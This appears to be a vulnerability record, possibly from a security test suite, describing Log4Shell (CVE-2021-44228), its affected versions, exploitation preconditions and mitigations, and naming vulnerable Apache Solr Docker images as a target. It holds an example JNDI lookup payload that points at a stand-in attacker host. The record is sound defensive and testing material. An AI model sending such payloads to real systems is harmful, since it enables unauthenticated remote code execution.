CVE description: CVE-2021-44228, widely known as “Log4Shell,” is a critical flaw in the Apache Log4j 2 core logging library used by many Java applications. The vulnerability stems from Log4j 2’s message lookup substitution feature combined with the JNDI (Java Naming and Directory Interface) lookup capability. When Log4j 2 processes a log message or parameter containing a lookup pattern such as ${jndi:ldap://attacker-host/payload}, it can reach out to an attacker-controlled JNDI endpoint (commonly via LDAP, but also RMI or other supported protocols). Prior to complete fixes, Log4j 2 would resolve the attacker’s reference, fetch remote content (for example, a Java class), and instantiate it. If the attacker can cause any of their input to be logged by a vulnerable application, this chain results in remote code execution within the target application’s process.

Key technical points:
- Affected component: only the log4j-core artifact of Apache Log4j 2 is vulnerable (log4j-api alone and other Apache logging projects such as log4net/log4cxx are not affected).
- Vulnerable versions (per NVD/NIST): 2.0-beta9 through 2.15.0, with exceptions/backports where the issue is disabled or removed (2.12.2, 2.12.3, and 2.3.1 are not vulnerable). In 2.15.0, lookups are disabled by default but not fully removed; 2.16.0 and later (and the cited backports) remove the JNDI lookups behavior entirely. The practical vulnerable set commonly referenced operationally is Log4j 2.0–2.14.1 in typical default configurations.
- Exploitation preconditions: (1) the application includes a vulnerable log4j-core version and has message lookups/JNDI enabled; (2) attacker-controlled data is logged; (3) outbound connectivity from the target to attacker infrastructure (for example, LDAP/LDAPS/HTTP) is possible.
- Typical attack vector: the attacker sends input containing ${jndi:ldap://...} via any field that gets logged (for example, HTTP headers, form fields, chat messages). Log4j resolves the lookup and retrieves malicious content from the attacker’s directory service, leading to code execution.
- Impact: remote, unauthenticated execution of arbitrary code with the privileges of the Java process, enabling complete compromise of the affected system and potentially lateral movement.
- Mitigation highlights: upgrade to Log4j 2.17.x+ (or vendor backports where applicable), remove the JndiLookup class from the classpath, disable lookups at runtime and in configuration, and restrict egress to block LDAP/RMI/other JNDI resolutions.

Attack Type: Remote code execution over the network without authentication
Services (format: [SERVICE-DEPENDENCY-TYPE][SERVICE-NAME][SERVICE-VERSIONS] SERVICE-DESCRIPTION):
- [HARD][solr][['7.0.0---8.11.0']] Apache Solr distributions in these versions bundle vulnerable Apache Log4j 2 core libraries and log user-supplied content in normal operation. Running Solr in this range makes the containerized system directly exposed to CVE-2021-44228 without needing any additional services. The official Docker Hub image "solr" includes the Java runtime already, so no external runtime or web server is required to have a working, testable system that is vulnerable.
